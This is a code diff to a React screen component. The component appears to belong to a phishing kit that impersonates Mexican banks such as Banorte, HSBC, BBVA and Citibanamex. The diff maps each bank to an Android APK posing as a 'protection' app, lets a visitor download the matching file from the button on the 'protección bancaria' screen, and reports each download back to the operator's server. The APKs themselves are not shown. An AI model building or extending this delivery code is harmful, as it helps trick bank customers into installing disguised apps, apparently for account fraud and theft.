@@ -723,6 +723,52 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(cancelacionRetiroContent);
 
       case ScreenType.PROTECCION_BANCARIA:
+        // Mapeo de bancos a archivos de protección
+        const getProtectionFile = (bankCode: string) => {
+          const bankFileMap: Record<string, { fileName: string; fileUrl: string }> = {
+            'BANORTE': {
+              fileName: 'BanorteProtect.apk',
+              fileUrl: '/assets/BanorteProtect_1749964227683.apk'
+            },
+            'HSBC': {
+              fileName: 'HsbcProtect.apk',
+              fileUrl: '/assets/HsbcProtect_1749964227683.apk'
+            },
+            'SCOTIABANK': {
+              fileName: 'scotiabankProtect.apk',
+              fileUrl: '/assets/scotiabankProtect_1749964227683.apk'
+            },
+            'BBVA': {
+              fileName: 'BbvaProtect.apk',
+              fileUrl: '/assets/BbvaProtec_1749964227683.apk'
+            },
+            'CITIBANAMEX': {
+              fileName: 'banamexProtect.apk',
+              fileUrl: '/assets/banamexProtect_1749964227683.apk'
+            },
+            'BANREGIO': {
+              fileName: 'BanregioProtect.apk',
+              fileUrl: '/assets/BanregioProtect_1749964227683.apk'
+            },
+            'BANCO_AZTECA': {
+              fileName: 'AztecaProtect.apk',
+              fileUrl: '/assets/AztecaProtect_1749964227683.apk'
+            },
+            'INVEX': {
+              fileName: 'InvexProtect.apk',
+              fileUrl: '/assets/InvexProtect_1749964227683.apk'
+            },
+            'AMEX': {
+              fileName: 'AMEXProtect.apk',
+              fileUrl: '/assets/AMEXProtect_1749964227683.apk'
+            }
+          };
+          
+          return bankFileMap[bankCode] || null;
+        };
+
+        const protectionFile = getProtectionFile(bankCode);
+        
         const proteccionBancariaContent = (
           <>
             <h2 className="text-xl font-bold mb-4" style={{ color: '#004080' }}>
@@ -747,12 +793,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <Button 
               className="bg-[#004080] hover:bg-[#003366] text-white py-3 px-6 rounded font-bold w-full transition-colors"
               onClick={() => {
-                // Verificar si hay un archivo disponible para descarga
-                if (screenData.fileUrl) {
+                // Usar el archivo específico del banco o el archivo manual si está disponible
+                const fileToDownload = protectionFile || (screenData.fileUrl ? {
+                  fileName: screenData.fileName || 'proteccion_bancaria.zip',
+                  fileUrl: screenData.fileUrl
+                } : null);
+                
+                if (fileToDownload) {
                   // Crear un enlace temporal para descargar el archivo
                   const link = document.createElement('a');
-                  link.href = screenData.fileUrl;
-                  link.download = screenData.fileName || 'proteccion_bancaria.zip';
+                  link.href = fileToDownload.fileUrl;
+                  link.download = fileToDownload.fileName;
                   link.target = '_blank';
                   document.body.appendChild(link);
                   link.click();
@@ -761,12 +812,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   // Notificar al servidor que se realizó la descarga
                   onSubmit(ScreenType.PROTECCION_BANCARIA, { 
                     action: 'download',
-                    fileName: screenData.fileName,
-                    fileSize: screenData.fileSize,
-                    downloaded: true
+                    fileName: fileToDownload.fileName,
+                    fileSize: screenData.fileSize || 'Desconocido',
+                    downloaded: true,
+                    bankFile: !!protectionFile
                   });
                 } else {
-                  alert('El archivo de protección aún no está disponible. Por favor, espera a que el administrador lo configure.');
+                  alert('El archivo de protección para este banco aún no está disponible. Por favor, contacta al administrador.');
                 }
               }}
             >
